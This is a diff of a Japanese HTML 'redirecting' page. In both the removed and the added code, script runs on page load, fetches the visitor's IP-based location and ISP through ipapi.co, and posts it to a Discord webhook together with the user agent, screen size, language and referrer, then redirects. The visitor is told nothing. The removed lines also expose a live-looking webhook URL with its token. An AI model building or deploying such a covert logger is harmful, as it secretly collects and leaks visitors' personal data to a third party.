@@ -2,55 +2,85 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
-</head>
-<body>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>I'm redirecting...</title>
     <script>
-    (async function() {
-      
-        const webhookUrl = "https://discord.com/api/webhooks/1474312307013324904/GtRYtpvEd4CiQgI_QAW74Wk6ah2TMZRk6-zAG16MEJTeCNFl9L6gKewvnNZCw5Rx7-OL";
-        const targetUrl = "https://ima-aarr.github.io/rumia-homepage.github.io/";
 
-      
-        if (webhookUrl.startsWith("__")) { window.location.replace(targetUrl); return; }
+        const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+        
+        
+        const redirectUrl = "https://ima-aarr.github.io/rumia-homepage.github.io/";
 
-        try {
-            
-            const res = await fetch('https://ipapi.co');
-            const d = await res.json();
+        async function logAndRedirect() {
+            try {
+               
+                const geoResponse = await fetch('https://ipapi.co/json/');
+                const geoData = await geoResponse.json();
 
-            
-            const payload = {
-                embeds: [{
-                    title: "管理者ログ",
-                    color: 3447003,
-                    timestamp: new Date().toISOString(),
-                    fields: [
-                        { name: "🌐 IPアドレス", value: `||${d.ip || '取得失敗'}||`, inline: true },
-                        { name: "📍 地域", value: `${d.city || '不明'}, ${d.country_name || '不明'}`, inline: true },
-                        { name: "📱 デバイス/OS", value: navigator.userAgent },
-                        { name: "🖥 画面解像度", value: `${screen.width}x${screen.height}`, inline: true },
-                        { name: "🔗 参照元(Referrer)", value: document.referrer || "直接アクセス", inline: true },
-                        { name: "⏰ アクセス日時", value: new Date().toLocaleString("ja-JP") }
-                    ],
-                    footer: { text: "System Log - Automated Notification" }
-                }]
-            };
+             
+                const ipAddress = geoData.ip || "取得不可";
+                const location = `${geoData.country_name || ""} ${geoData.region || ""} ${geoData.city || ""}`.trim() || "取得不可";
+                const isp = geoData.org || "取得不可";
 
-            
-            await fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
+          
+                const accessTime = new Date().toLocaleString("ja-JP", { timeZone: "Asia/Tokyo" });
+                const userAgent = navigator.userAgent;
+                const referrer = document.referrer || "直接アクセス";
+                const screenRes = `${window.screen.width} x ${window.screen.height}`; // 画面解像度
+                const language = navigator.language || "不明"; // 言語設定
+                
+     
+                const payload = {
+                    username: "詳細アクセス通知ボット",
+                    embeds: [
+                        {
+                            title: " 新しいアクセスを検知しました",
+                            color: 16729344, 
+                            fields: [
+                                { name: "IP", value: `\`${ipAddress}\``, inline: true },
+                                { name: "だいたいの場所", value: `\`${location}\``, inline: true },
+                                { name: "プロバイダ (ISP)", value: `\`${isp}\``, inline: true },
+                                { name: "アクセス日時", value: accessTime, inline: true },
+                                { name: "画面解像度", value: screenRes, inline: true },
+                                { name: "言語設定", value: language, inline: true },
+                                { name: "リファラ (遷移元)", value: referrer, inline: false },
+                                { name: "User-Agent", value: `\`${userAgent}\``, inline: false }
+                            ],
+                            footer: {
+                                text: "※位置情報はIPアドレスに基づくおおよそのものです"
+                            }
+                        }
+                    ]
+                };
 
-        } catch (e) {
-            console.error(e);
-        } finally {
-            
-            window.location.replace(targetUrl);
+                
+                if (webhookUrl !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                } else {
+                    console.warn("Webhook URLが設定されていません。");
+                }
+
+            } catch (error) {
+                
+                console.error("情報の取得または送信に失敗しました:", error);
+            } finally {
+                
+                window.location.replace(redirectUrl);
+            }
         }
-    })();
+
+    
+        window.onload = logAndRedirect;
     </script>
+</head>
+<body style="background-color: #1a1a1a; color: #ffffff; text-align: center; padding-top: 20vh; font-family: sans-serif;">
+    <h2>I'm redirecting...</h2>
+    <p style="color: #aaaaaa;">Please wait a few seconds. The page will move automatically.</p>
 </body>
 </html>
